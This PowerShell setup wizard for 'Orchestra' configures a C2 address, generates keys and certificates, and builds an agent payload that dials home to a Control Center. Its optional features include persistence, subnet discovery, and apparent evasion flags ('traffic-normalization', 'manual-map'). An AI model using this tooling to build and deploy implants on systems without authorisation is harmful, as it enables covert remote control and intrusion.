# scripts/setup.ps1 — Interactive Orchestra setup wizard (PowerShell).
#
# Walks an operator step-by-step through:
#   1. Verifying / installing the Rust toolchain.
#   2. Picking the target OS / architecture for the agent payload.
#   3. Picking the deployment style (outbound recommended).
#   4. Picking the C2 / Control-Center address (auto-detects LAN IP).
#   5. Optional Cargo features.
#   6. Generating strong AES key, agent PSK, and admin bearer token.
#   7. Generating a self-signed TLS cert covering the chosen address.
#   8. Writing profiles/<name>.toml and orchestra-server.toml.
#   9. Building the agent payload.
#  10. Building & optionally launching the Control Center.
#
# This script is intended for use on systems you own or manage.

#Requires -Version 5.1
[CmdletBinding()]
param()

$ErrorActionPreference = "Stop"
$Root = Resolve-Path (Join-Path $PSScriptRoot "..")
Set-Location $Root

function Say($msg)  { Write-Host "`e[1;34m[setup]`e[0m $msg" }
function Ok($msg)   { Write-Host "`e[1;32m[ ok ]`e[0m $msg" }
function Warn($msg) { Write-Host "`e[1;33m[warn]`e[0m $msg" -ForegroundColor Yellow }
function Fail($msg) { Write-Host "`e[1;31m[fail]`e[0m $msg" -ForegroundColor Red; exit 1 }

function Prompt-Value($question, $default = "") {
    if ($default) {
        $reply = Read-Host "? $question [$default]"
        if (-not $reply) { $reply = $default }
    } else {
        $reply = Read-Host "? $question"
    }
    return $reply
}

function Choose($question, [string[]]$options) {
    Write-Host "? $question"
    for ($i = 0; $i -lt $options.Count; $i++) {
        Write-Host "    $($i+1)) $($options[$i])"
    }
    while ($true) {
        $reply = Read-Host "  choose 1-$($options.Count)"
        if ($reply -match '^\d+$' -and [int]$reply -ge 1 -and [int]$reply -le $options.Count) {
            return $options[[int]$reply - 1]
        }
        Warn "invalid choice"
    }
}

function Confirm($question) {
    $reply = Read-Host "? $question [y/N]"
    return $reply -match '^[Yy]$'
}

function GenBase64($bytes) {
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $buf = New-Object byte[] $bytes
    $rng.GetBytes($buf)
    return [Convert]::ToBase64String($buf)
}

# ── Banner ────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "================================================================================"
Write-Host " Orchestra step-by-step setup wizard (PowerShell)"
Write-Host " Project root: $Root"
Write-Host "================================================================================"
Write-Host ""

# ── 0. Preflight ──────────────────────────────────────────────────────────

if (-not (Get-Command cargo -ErrorAction SilentlyContinue)) {
    Warn "Rust toolchain (cargo) not found."
    if (Confirm "Install Rust now via rustup?") {
        Invoke-RestMethod -Uri https://sh.rustup.rs -UseBasicParsing | ForEach-Object {
            # rustup-init.exe is the Windows path
        }
        $installScript = "$env:TEMP\rustup-init.ps1"
        Invoke-WebRequest -Uri "https://win.rustup.rs/x86_64" -OutFile "$env:TEMP\rustup-init.exe" -UseBasicParsing
        & "$env:TEMP\rustup-init.exe" -y --default-toolchain stable
        $env:PATH = "$env:USERPROFILE\.cargo\bin;$env:PATH"
    } else {
        Fail "Rust is required. Install from https://rustup.rs and re-run."
    }
}

$cargoVer = cargo --version 2>&1
Ok "cargo: $cargoVer"

# ── 1. Profile name ──────────────────────────────────────────────────────

$profileName = Prompt-Value "Profile name (alphanumeric, used for profile + payload filenames)" "my_agent"
if ($profileName -notmatch '^[A-Za-z0-9_-]+$') { Fail "invalid profile name" }
$profilePath = "profiles\$profileName.toml"
if (Test-Path $profilePath) {
    if (-not (Confirm "Profile $profilePath already exists. Overwrite?")) { Fail "aborted" }
}

# ── 2. Target OS / arch ──────────────────────────────────────────────────

$targetOs = Choose "Target operating system for the payload?" @(
    "linux   (x86_64-unknown-linux-gnu)",
    "windows (x86_64-pc-windows-msvc / .exe)",
    "macos   (x86_64-apple-darwin)"
)
$targetOs = ($targetOs -split '\s+')[0]

$targetArch = Choose "Target CPU architecture?" @("x86_64", "aarch64")

# ── 3. Deployment style ──────────────────────────────────────────────────

$deploy = Choose "Deployment style?" @(
    "outbound  — single self-contained binary that dials the Control Center (recommended)",
    "launcher  — small stub fetches an AES-encrypted agent payload over HTTP"
)
$deploy = ($deploy -split '\s+')[0]

# ── 4. Addresses ─────────────────────────────────────────────────────────

$detectedIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    $_.IPAddress -notmatch '^(127|169\.254)' -and $_.PrefixOrigin -ne 'WellKnown'
} | Select-Object -First 1).IPAddress
if (-not $detectedIp) { $detectedIp = "127.0.0.1" }

if ($deploy -eq "outbound") {
    $c2Host = Prompt-Value "Control Center host/IP the payload should dial home to" $detectedIp
    $c2Port = Prompt-Value "Control Center agent port" "8444"
    $httpPort = Prompt-Value "Control Center HTTPS dashboard port" "8443"
} else {
    $c2Host = Prompt-Value "C2 host/IP the agent should connect to (or listen on)" $detectedIp
    $c2Port = Prompt-Value "C2 port" "7890"
    $httpPort = Prompt-Value "Control Center HTTPS dashboard port" "8443"
}
$c2Addr = "${c2Host}:${c2Port}"
Say "C2 address baked into payload: $c2Addr"

# ── 5. Optional features ─────────────────────────────────────────────────

$features = @()
if ($deploy -eq "outbound") { $features += "outbound-c" }

Write-Host ""
Write-Host "Optional Cargo features (off by default; enable per-deployment as needed):"
Write-Host "  persistence            — re-launch agent across reboots (systemd / launchd / scheduled task)"
Write-Host "  network-discovery      — passive subnet enumeration for inventory"
Write-Host "  env-validation         — startup environment policy checks"
Write-Host "  perf-optimize          — experimental optimizer compatibility flag"
Write-Host "  traffic-normalization  — experimental transport-shaping compatibility flag"
Write-Host "  manual-map             — experimental Windows manual-map compile flag"
Write-Host ""

$extraFeat = Prompt-Value "Comma-separated extras to enable (Enter for none)" ""
if ($extraFeat) {
    $parts = $extraFeat -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ }
    $features += $parts
}

Say "Features: $(($features -join ', '),'<none>'[$features.Count -eq 0])"

# ── 6. Credentials ───────────────────────────────────────────────────────

New-Item -ItemType Directory -Force -Path secrets, profiles, dist | Out-Null

$aesKey = GenBase64 32
$agentSecret = GenBase64 32
$adminToken = (GenBase64 24) -replace '\+','-' -replace '/','_' -replace '=',''

$credFile = "secrets\$profileName.env"
@"
# Orchestra credentials for profile: $profileName
# Generated: $(Get-Date -Format 'o' -AsUTC)
PROFILE_NAME=$profileName
TARGET_OS=$targetOs
TARGET_ARCH=$targetArch
DEPLOY=$deploy
C2_ADDR=$c2Addr
HTTP_PORT=$httpPort
AES_KEY=$aesKey
AGENT_SECRET=$agentSecret
ADMIN_TOKEN=$adminToken
"@ | Set-Content $credFile -Force
Ok "credentials saved: $credFile"

# ── 7. TLS cert ──────────────────────────────────────────────────────────

$cert = "secrets\$profileName-server.crt"
$key  = "secrets\$profileName-server.key"

if (-not (Test-Path $cert) -or -not (Test-Path $key)) {
    Say "Generating self-signed TLS cert covering 127.0.0.1, $c2Host, localhost"
    $san = "IP:127.0.0.1,IP:${c2Host},DNS:localhost"
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:P-256 -days 365 `
        -keyout $key -out $cert `
        -subj "/CN=orchestra-control-center" `
        -addext "subjectAltName=$san" 2>$null
    if ($LASTEXITCODE -ne 0) { Fail "openssl failed (is OpenSSL installed?)" }
    Ok "TLS material: $cert / $key"
}

$certFp = (openssl x509 -in $cert -outform DER 2>$null | openssl dgst -sha256 2>$null) -replace '.*= ',''
if (-not $certFp) { $certFp = "unavailable" }
Ok "server certificate SHA-256 fingerprint: $certFp"

# ── 8. Write profile + server config ─────────────────────────────────────

$featToml = '["' + ($features -join '", "') + '"]'

if ($deploy -eq "outbound") {
    $package = "agent"
    $binName = "agent-standalone"
} else {
    $package = "agent"
    $binName = ""
}

@"
# Auto-generated by scripts/setup.ps1 on $(Get-Date -Format 'o' -AsUTC)
target_os         = "$targetOs"
target_arch       = "$targetArch"
c2_address        = "$c2Addr"
encryption_key    = "$aesKey"
$(if ($deploy -eq "outbound") {
"c_server_secret   = `"$agentSecret`"
server_cert_fingerprint = `"$certFp`""
})
features          = $featToml
package           = "$package"
$(if ($binName) { "bin_name          = `"$binName`"" })
"@ | Set-Content $profilePath -Force
Ok "profile written: $profilePath"

$serverCfg = "orchestra-server.toml"
if (-not (Test-Path $serverCfg) -or (Confirm "Overwrite existing $serverCfg with new credentials?")) {
    @"
# Auto-generated by scripts/setup.ps1
http_addr           = "0.0.0.0:${httpPort}"
agent_addr          = "0.0.0.0:${c2Port}"
agent_shared_secret = "${agentSecret}"
admin_token         = "${adminToken}"
audit_log_path      = "secrets/orchestra-audit.jsonl"
static_dir          = "orchestra-server/static"
tls_cert_path       = "${cert}"
tls_key_path        = "${key}"
command_timeout_secs = 30
"@ | Set-Content $serverCfg -Force
    Ok "server config: $serverCfg"
}

# ── 9. Build ─────────────────────────────────────────────────────────────

Say "Building orchestra-builder (release)..."
cargo build --release -p builder
if ($LASTEXITCODE -ne 0) { Fail "builder compile failed" }
$builder = "$Root\target\release\orchestra-builder.exe"
Ok "builder ready: $builder"

Say "Building agent payload via orchestra-builder..."
& $builder build $profileName
if ($LASTEXITCODE -ne 0) { Fail "builder build failed" }

$payloadPath = "dist\$profileName.enc"
if (-not (Test-Path $payloadPath)) { $payloadPath = "dist\$profileName" }
Ok "agent payload: $payloadPath"

# ── 10. Summary ──────────────────────────────────────────────────────────

Write-Host ""
Write-Host "================================================================================"
Write-Host " Setup complete."
Write-Host ""
Write-Host " Profile           : $profilePath"
Write-Host " Credentials       : $credFile  (keep private!)"
Write-Host " Payload           : $payloadPath"
Write-Host " Server config     : $serverCfg"
Write-Host " Dashboard URL     : https://${c2Host}:${httpPort}/"
Write-Host " Admin bearer token: ${adminToken}"
Write-Host ""
Write-Host " Reminder: only deploy to systems you own or are authorised to manage."
Write-Host "================================================================================"
Write-Host ""

if (Confirm "Start the Orchestra Control Center now?") {
    Say "Building Orchestra Control Center..."
    cargo build --release -p orchestra-server
    if ($LASTEXITCODE -ne 0) { Fail "server compile failed" }

    Say "Starting Control Center..."
    & "$Root\target\release\orchestra-server.exe" --config $serverCfg
}
